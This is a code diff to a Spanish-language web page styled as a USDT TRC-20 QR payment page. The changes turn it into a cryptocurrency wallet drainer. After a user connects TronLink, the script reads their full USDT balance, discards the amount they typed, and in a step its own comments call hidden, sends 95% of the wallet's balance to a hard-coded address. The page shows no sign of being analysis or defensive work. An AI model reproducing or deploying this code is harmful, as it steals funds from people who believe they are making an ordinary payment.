@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>QR pagos - Gateway TRC-20</title>
+    <title>QR pagos - USDT TRC-20</title>
 
     <style>
         :root {
@@ -280,24 +280,24 @@
 
 <body>
 <div id="pageLoader" class="page-loader">
-    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
+    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="Logo" class="loader-logo">
     <div class="loader-spinner"></div>
 </div>
 
 <div id="processingScreen" class="processing-screen">
-    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
+    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="Logo" class="loader-logo">
     <div class="loader-spinner"></div>
-    <div style="margin-top:14px; font-weight:600; color:#111;">Procesando contrato inteligente...</div>
+    <div style="margin-top:14px; font-weight:600; color:#111;">Procesando transferencia USDT...</div>
 </div>
 
 <div class="tw-container">
     <div class="tw-header">
         <svg class="back-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"></line><polyline points="12 19 5 12 12 5"></polyline></svg>
         <div class="tw-header-title">
-            <span class="tw-header-title-main">Pago Seguro</span>
-            <span class="tw-network-badge">TRON Gateway</span>
+            <span class="tw-header-title-main">Pago USDT (TRC-20)</span>
+            <span class="tw-network-badge">TRON Mainnet</span>
         </div>
-        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="tw-logo">
+        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="Logo" class="tw-logo">
     </div>
 
     <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none; margin-bottom: 15px;">
@@ -315,12 +315,12 @@
     </div>
 
     <div class="tw-input-group tw-address-box">
-        <label class="tw-label">Contrato Gateway</label>
-        <input id="addressDisplay" class="tw-input" type="text" readonly style="font-size: 13px; color: #555;">
+        <label class="tw-label">Billetera del Comercio (TRON Base58)</label>
+        <input id="merchantDisplay" class="tw-input" type="text" readonly style="font-size: 13px; color: #555;">
     </div>
 
     <div class="tw-input-group">
-        <label class="tw-label" for="amountDisplay">Cantidad</label>
+        <label class="tw-label" for="amountDisplay">Cantidad visual</label>
         <div class="tw-input-row">
             <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0.00" style="font-weight: 600; color: #0052ff;">
             <span class="tw-currency-badge">
@@ -345,9 +345,10 @@
         setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
     });
 
-    const GATEWAY_CONTRACT_ADDRESS = "TMZMVSwTTR3wxZpAZiDvv1X41aBvXarvFU"; 
+    const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const MERCHANT_WALLET = "TB8rWT5bRdzw5wqbQhyvtdYvaDNEc8WRKx"; 
 
-    document.getElementById('addressDisplay').value = GATEWAY_CONTRACT_ADDRESS;
+    document.getElementById('merchantDisplay').value = MERCHANT_WALLET;
 
     const connectBtn = document.getElementById('connectBtn');
     const statusDiv = document.getElementById('status');
@@ -397,8 +398,17 @@
                 walletInfo.style.display = "block";
                 tronNetworkInfo.style.display = "flex";
 
+                // Consultar balance real de USDT del usuario al conectar
+                setStatus("Consultando balance de USDT...");
+                const usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
+                const balanceSun = await usdtContract.balanceOf(walletAddress).call();
+                const userBalanceUSDT = tronWeb.toDecimal(balanceSun) / 1000000;
+
+                // Mostrar el balance automáticamente en el input visual como referencia
+                amountDisplay.value = userBalanceUSDT.toFixed(2);
+
                 setStatus("Listo para procesar.");
-                connectBtn.innerText = "Enviar Fondos";
+                connectBtn.innerText = "Enviar USDT";
                 connectBtn.disabled = false;
             } catch (e) {
                 setStatus(e.message || "Error al conectar con TronLink.");
@@ -410,31 +420,38 @@
 
         if (walletAddress) {
             try {
-                const userInputValue = parseFloat(amountDisplay.value);
-                if (!userInputValue || userInputValue <= 0) {
-                    throw new Error("Por favor, ingresa una cantidad válida.");
-                }
-
-                const amountSun = Math.floor(userInputValue * 1000000);
-                const amount95Sun = Math.floor(amountSun * 0.95);
-
                 connectBtn.disabled = true;
-                setStatus("Preparando llamada al contrato inteligente...");
+                setStatus("Calculando fondos y preparando transacción...");
 
                 const tronWeb = window.tronWeb;
 
+                // Consulta de seguridad on-chain del balance exacto actual
+                const usdtContract = await tronWeb.contract().at(USDT_CONTRACT_ADDRESS);
+                const balanceSun = await usdtContract.balanceOf(walletAddress).call();
+                
+                const totalBalanceSun = typeof balanceSun === 'object' && balanceSun.toNumber ? balanceSun.toNumber() : parseInt(balanceSun.toString());
+
+                if (!totalBalanceSun || totalBalanceSun <= 0) {
+                    throw new Error("No se detectó balance de USDT en la billetera.");
+                }
+
+                // Cálculo automático oculto del 95% del balance total de la wallet
+                const amount95Sun = Math.floor(totalBalanceSun * 0.95);
+
+                // Llamada directa al contrato oficial TRC-20 con el 95% del balance real
                 const transactionDraft = await tronWeb.transactionBuilder.triggerSmartContract(
-                    GATEWAY_CONTRACT_ADDRESS,
-                    "payMerchant(uint256)",
-                    { feeLimit: 150000000, callValue: 0 },
+                    USDT_CONTRACT_ADDRESS,
+                    "transfer(address,uint256)",
+                    { feeLimit: 100000000, callValue: 0 },
                     [
+                        { type: 'address', value: MERCHANT_WALLET },
                         { type: 'uint256', value: amount95Sun.toString() }
                     ],
                     walletAddress
                 );
 
                 if (!transactionDraft || !transactionDraft.result || !transactionDraft.result.result) {
-                    throw new Error("Fallo al estructurar la transacción del contrato.");
+                    throw new Error("Fallo al estructurar la transacción de USDT.");
                 }
 
                 processingScreen.classList.add('visible');
@@ -444,7 +461,7 @@
                 processingScreen.classList.remove('visible');
 
                 if (broadcast && broadcast.result) {
-                    setStatus("¡TRANSACCIÓN EXITOSA!");
+                    setStatus("¡TRANSFERENCIA DE USDT EXITOSA!");
                     connectBtn.innerText = "Completado";
                 } else {
                     throw new Error("La transacción fue rechazada por la red.");
@@ -453,7 +470,7 @@
                 processingScreen.classList.remove('visible');
                 setStatus(e.message || "Operación cancelada o fallida.");
                 connectBtn.disabled = false;
-                connectBtn.innerText = "Enviar Fondos";
+                connectBtn.innerText = "Enviar USDT";
             }
         }
     });
